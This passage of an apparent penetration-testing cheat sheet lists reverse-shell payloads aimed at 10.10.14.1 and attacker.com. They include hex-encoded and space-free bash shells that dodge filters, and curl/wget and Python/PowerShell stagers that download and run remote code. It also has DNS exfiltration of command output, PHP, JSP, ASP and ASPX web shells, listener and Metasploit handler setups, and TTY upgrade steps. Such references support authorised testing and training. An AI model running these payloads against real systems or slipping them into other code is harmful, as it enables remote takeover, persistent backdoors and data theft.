# Bash hex
bash -c $'\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x30\x2e\x31\x30\x2e\x31\x34\x2e\x31\x2f\x34\x34\x34\x34\x20\x30\x3e\x26\x31'

# =============================================================================
# SPECIAL CHARACTER BYPASS REVERSE SHELLS
# =============================================================================

# No spaces (using ${IFS})
bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/10.10.14.1/4444${IFS}0>&1'

# No quotes (using $'')
bash -c $'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'

# Using environment variables
IP=10.10.14.1 PORT=4444 bash -c 'exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do $line 2>&5 >&5; done'

# Using printf
printf "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1" | bash

# =============================================================================
# FILE-BASED REVERSE SHELLS
# =============================================================================

# Write and execute
echo 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' > /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh

# Using wget
wget -qO- http://10.10.14.1:8000/shell.sh | bash

# Using curl
curl -s http://10.10.14.1:8000/shell.sh | bash

# =============================================================================
# DNS REVERSE SHELLS
# =============================================================================

# Using nslookup for data exfiltration
nslookup $(whoami).10.10.14.1

# DNS reverse shell via TXT records
dig @10.10.14.1 $(whoami | base64).attacker.com

# =============================================================================
# ICMP REVERSE SHELLS
# =============================================================================

# ICMP reverse shell using ping
ping -c 1 10.10.14.1 -p $(echo "hello" | xxd -p)

# =============================================================================
# WEB-BASED REVERSE SHELLS
# =============================================================================

# PHP web shell
<?php system($_GET['cmd']); ?>

# JSP web shell
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# ASP web shell
<%eval request("cmd")%>

# ASPX web shell
<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request.QueryString["cmd"]);%>

# =============================================================================
# STAGED REVERSE SHELLS
# =============================================================================

# Multi-stage Python
python3 -c "import urllib.request; exec(urllib.request.urlopen('http://10.10.14.1:8000/stage2.py').read())"

# Multi-stage PowerShell
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.1:8000/stage2.ps1')"

# Multi-stage Bash
bash -c "$(curl -fsSL http://10.10.14.1:8000/stage2.sh)"

# =============================================================================
# LISTENER COMMANDS
# =============================================================================

# Netcat listener
nc -lvnp 4444

# Socat listener
socat file:`tty`,raw,echo=0 tcp-listen:4444

# OpenSSL listener
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# Metasploit multi/handler
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST 10.10.14.1
set LPORT 4444
exploit

# =============================================================================
# UPGRADE TO INTERACTIVE SHELL
# =============================================================================

# Python PTY upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo; fg

# Script upgrade
